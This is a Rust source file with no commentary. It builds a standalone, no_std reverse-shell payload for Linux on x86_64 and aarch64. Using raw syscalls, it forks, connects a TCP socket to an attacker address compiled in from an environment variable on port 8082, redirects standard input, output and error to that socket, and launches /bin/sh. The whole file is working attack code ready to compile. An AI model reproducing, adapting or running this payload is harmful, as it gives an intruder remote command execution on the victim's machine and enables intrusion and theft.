#![no_main]
#![no_std]
use core::arch::asm;

const PORT: u16 = 8082;
const IP: &str = core::env!("IP");

#[cfg(target_arch = "x86_64")]
mod consts {
    pub const SYS_FORK: usize = 57;
    pub const SYS_DUP3: usize = 292;
    pub const SYS_SOCKET: usize = 41;
    pub const SYS_CONNECT: usize = 42;
    pub const SYS_EXECVE: usize = 59;
    pub const SYS_EXIT: usize = 60;
}

#[cfg(target_arch = "aarch64")]
mod consts {
    pub const SYS_CLONE: usize = 220;
    pub const CLONE_FLAGS: usize = 0;
    pub const SYS_DUP3: usize = 24;
    pub const SYS_SOCKET: usize = 198;
    pub const SYS_CONNECT: usize = 203;
    pub const SYS_EXECVE: usize = 221;
    pub const SYS_EXIT: usize = 93;
}
use consts::*;

const AF_INET: usize = 2;
const SOCK_STREAM: usize = 1;
const IPPROTO_IP: usize = 0;

const STDIN: usize = 0;
const STDOUT: usize = 1;
const STDERR: usize = 2;

#[repr(C)]
struct sockaddr_in {
    sin_family: u16,
    sin_port: u16,
    sin_addr: in_addr,
    sin_zero: [u8; 8],
}

#[repr(C)]
struct in_addr {
    s_addr: u32,
}

fn syscall3(syscall: usize, arg1: usize, arg2: usize, arg3: usize) -> isize {
    let ret: isize;
    #[cfg(target_arch = "x86_64")]
    unsafe {
        asm!(
            "syscall",
            in("rax") syscall,
            in("rdi") arg1,
            in("rsi") arg2,
            in("rdx") arg3,
            out("rcx") _,
            out("r11") _,
            lateout("rax") ret,
            options(nostack),
        );
    }
    #[cfg(target_arch = "aarch64")]
    unsafe {
        asm!(
            "svc #0",
            in("x8") syscall,
            in("x0") arg1,
            in("x1") arg2,
            in("x2") arg3,
            lateout("x0") ret,
            options(nostack)
        );
    };
    ret
}
fn sys_dup3(arg1: usize, arg2: usize, arg3: isize) -> usize {
    let ret: usize;
    #[cfg(target_arch = "x86_64")]
    unsafe {
        asm!(
            "syscall",
            in("rax") SYS_DUP3,
            in("rdi") arg1,
            in("rsi") arg2,
            in("rdx") arg3,
            out("rcx") _,
            out("r11") _,
            lateout("rax") ret,
            options(nostack),
        );
    }

    #[cfg(target_arch = "aarch64")]
    unsafe {
        asm!(
            "svc #0",
            in("x8") SYS_DUP3,
            in("x0") arg1,
            in("x1") arg2,
            in("x2") arg3,
            lateout("x0") ret,
            options(nostack)
        );
    }
    ret
}

#[cfg(target_arch = "x86_64")]
fn ip_str_to_beu32(ipv4_str: &str) -> u32 {
    let ip_it = ipv4_str.split('.');
    let mut r = [0u8; 4];
    for (idx, b) in ip_it.enumerate() {
        r[idx] = b.parse::<u8>().unwrap()
    }
    let mut res = (r[0] as u32) << 24;
    res |= (r[1] as u32) << 16;
    res |= (r[2] as u32) << 8;
    res |= r[3] as u32;
    res.to_be()
}
#[cfg(target_arch = "aarch64")]
fn ip_str_to_beu32(ipv4_str: &str) -> u32 {
    //simpler version doesnt work in aarch64 , due to iterator (needs memcmp, memcpy, etc...)
    let ipp = ipv4_str.as_bytes();
    let mut current = 0u8;
    let mut byte_idx = 0;
    let mut r = [0u8; 4];
    for b in ipp {
        match b {
            b'0'..=b'9' => {
                current = current * 10 + b - b'0'; // substract b'0' to have u8 numeric value of b
            }
            b'.' => {
                r[byte_idx] = current;
                byte_idx += 1;
                current = 0;
            }
            _ => {}
        }
    }
    r[byte_idx] = current;

    let mut res = (r[0] as u32) << 24;
    res |= (r[1] as u32) << 16;
    res |= (r[2] as u32) << 8;
    res |= r[3] as u32;
    res.to_be()
}
enum ForkResult {
    Parent(u32),
    Child,
}

fn exit(ret: isize) -> ! {
    #[cfg(target_arch = "x86_64")]
    unsafe {
        asm!(
        "syscall",
        in("rax") SYS_EXIT,
        in("rdi") ret,
        options(noreturn),
        );
    }
    #[cfg(target_arch = "aarch64")]
    unsafe {
        asm!(
        "svc #0",
        in("x8") SYS_EXIT,
        in("x0") ret,
        options(noreturn),
        );
    }
}

fn fork() -> Result<ForkResult, i32> {
    let mut result: isize;

    #[cfg(target_arch = "x86_64")]
    unsafe {
        asm!(
            "syscall",
            in("rax") SYS_FORK,
            lateout("rax") result,
            options(nostack, nomem),
        );
    }

    #[cfg(target_arch = "aarch64")]
    unsafe {
        asm!(
            "svc #0",
            in("x8") SYS_CLONE,
            in("x0") CLONE_FLAGS,
            in("x1") 0,
            in("x2") 0,
            in("x3") 0,
            in("x4") 0,
            lateout("x0") result,
        );
    }

    if result < 0 {
        Err(result as i32)
    } else if result == 0 {
        Ok(ForkResult::Child)
    } else {
        Ok(ForkResult::Parent(result as u32))
    }
}

#[no_mangle]
fn _start() {
    match fork() {
        Ok(ForkResult::Parent(_)) => exit(0),
        Ok(ForkResult::Child) => {
            let shell = *b"/bin/sh\0";
            let argv: [*const u8; 2] = [shell.as_ptr(), core::ptr::null()];
            let ip: u32 = ip_str_to_beu32(IP);
            let socket_addr = sockaddr_in {
                sin_family: AF_INET as u16,
                sin_port: PORT.to_be(),
                sin_addr: in_addr { s_addr: ip },
                sin_zero: [0; 8],
            };
            let socket_addr_len = core::mem::size_of::<sockaddr_in>();

            let socket_fd = syscall3(SYS_SOCKET, AF_INET, SOCK_STREAM, IPPROTO_IP);
            if socket_fd < 0 {
                panic!("error");
            }
            syscall3(
                SYS_CONNECT,
                socket_fd as usize,
                &socket_addr as *const sockaddr_in as usize,
                socket_addr_len as usize,
            );
            sys_dup3(socket_fd as usize, STDIN, 0);
            sys_dup3(socket_fd as usize, STDOUT, 0);
            sys_dup3(socket_fd as usize, STDERR, 0);
            syscall3(
                SYS_EXECVE,
                shell.as_ptr() as usize,
                argv.as_ptr() as usize,
                0,
            );
        }

        Err(_) => loop {},
    }
}
#[panic_handler]
fn panic(_: &core::panic::PanicInfo) -> ! {
    loop {}
}
